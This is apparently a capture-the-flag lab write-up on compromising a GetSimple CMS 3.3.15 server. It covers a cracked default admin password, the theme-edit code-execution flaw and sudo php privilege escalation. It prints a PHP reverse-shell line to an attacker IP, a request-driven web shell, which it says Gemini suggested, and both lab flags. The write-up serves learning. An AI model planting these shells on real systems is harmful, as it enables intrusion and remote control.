`IMPORTED FROM LIBRE OFFICE`
# Objective

**1. Get the flag located in the file “user.txt”**

**2. Escalate privileges and gain the flag of the file “root.txt” located in /root**

# 1 – Gaining initial Access

1. First a simple and noisy port scan for fast results and afterwards a more precise one for the 2x open ports: ![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_bf7a79c9.png)  

  
  

2. Chec![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_c33db6cb.png)  
king out website … seems like its using the “GetSimple” engine

  
  

3. Scanning for additional subsites via gobuster:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_876a4e54.png)

  
  

4. Checking if there are any known exploits for the “GetSimple” Engine...The RCE entries look very promising:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_fd5cbee8.png)

5. Now it is important to know, which version is running so I started clicking through the various subsites (mainly /data) and files. While doing so I accidentally found this admin.xml file, which looks like it contains a hashed admin password:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_ac895317.png)

  
  

6. It’s probably a SHA-1 Hash:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_48d16c40.png)

  
  

7. Wow, the password was “admin” (could have just tried it out beforehand ^^):

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_3147dd4c.png)

  
  

8. Nice! Admin Credentials worked. And we also see on the bottom, that it is Version “3.3.15”, which is before the patch after version “3.3.16”. Therefor chances are, that it is also vulnerable to the RCE:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_735e3067.png)

9. Alright, lets inform about how the exploit works...according to following github, the flaw is in the admin/theme-edit.php file:

[https://github.com/advisories/GHSA-c599-8gm5-c2jh](https://github.com/advisories/GHSA-c599-8gm5-c2jh)

  
  

10. So lets try to add a reverse shell (last line)…

**<?php -r '$sock=fsockopen("10.10.15.2",4242);exec("/bin/sh -i <&3 >&3 2>&3");'?>**

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_3161f255.png)

  
  

11. I started the netcat listener and tried to get the reverse shell on the webserver … but I couldn’t load the page directly:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_fbf98f72.png)  

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_72de34fd.png)  

12. To be honest. At this point I wasn’t sure, if my previously added PHP-code was faulty or if there’s an extra-step, which I was missing. That’s why I decided to ask “Gemini” for help. Which advised me to use “<?php system($_REQUEST['cmd']); ?>” and “manually” pop the shell via the according syntax sent to the “cmd”. What I did and worked out perfectly.

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_e768d06f.png)  
  

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_353d68f0.png)

13. And also upgrade the shell, in order to be able to use “su, sudo”, ctrl+c, arrows, etc:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_8f159a0f.png)

  
  

14. I first switched to the /home folder and tried to locate the “user.txt” file in order to get the first flag, which didn’t work, that’s why I just manually checked the folder and captured the first flag:

**7002d65b149b0a4d19132a66feed21d8**

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_de62abce.png)  

# 2 – Privilege Escalation

1. I started with checking for any files executable as root without password:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_850a1263.png)

  
  

2. According to the magic byte “?ELF” it’s probably a binary file (executable). If I understood it correctly, it is responsible for executing .php scripts. Therefor it should be possible to create a php based reverse shell and execute it with sudo… only thing, it wasn’t possible to create the .php file

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_8d20b1f2.png)

3. So I checked for an alternative, which allowed me to execute the reverse shell directly in the /usr/bin/php:

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_f70d06e1.png)

4. Afterwards I just checked for the root.txt file and grabbed the flag without upgrading the shell or anything:

**f1fba6e9f71efb2630e6e34da6387842**

![](file:///tmp/lu1790824bgjns5.tmp/lu1790824bgjnss_tmp_c2962fea.png)